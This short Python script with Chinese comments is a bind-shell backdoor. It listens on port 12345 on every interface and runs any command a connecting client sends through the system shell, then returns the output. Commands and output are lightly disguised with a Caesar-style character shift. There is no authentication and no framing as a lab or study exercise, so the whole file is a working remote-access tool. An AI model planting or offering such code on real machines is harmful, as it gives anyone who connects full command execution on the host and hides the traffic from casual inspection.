import socket,subprocess

def Caesar(i,string1):#凯撒密码加密与解密
    string2 = ''
    if i == 0:#加密
        for a in string1:string2 = string2 + chr(ord(a)+319)
    elif i == 1:#解密
        for a in string1:string2 = string2 + chr(ord(a)-319)
    return string2
def Shell(cmd):#执行shell
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read()
    err = shell.stderr.read()
    if out == b'' and err == b'':#避免向套间字发送b''造成连接中断
        out = b' '
    return out+err

if '__main__' == __name__:
    t = socket.socket()
    t.bind(('', 12345))
    t.listen(1)
    c,ip = t.accept()
    while True:
        cmd = Caesar(1,c.recv(2048).decode())
        c.send(Caesar(0,Shell(cmd).decode()).encode())
    c.close()
    t.close()
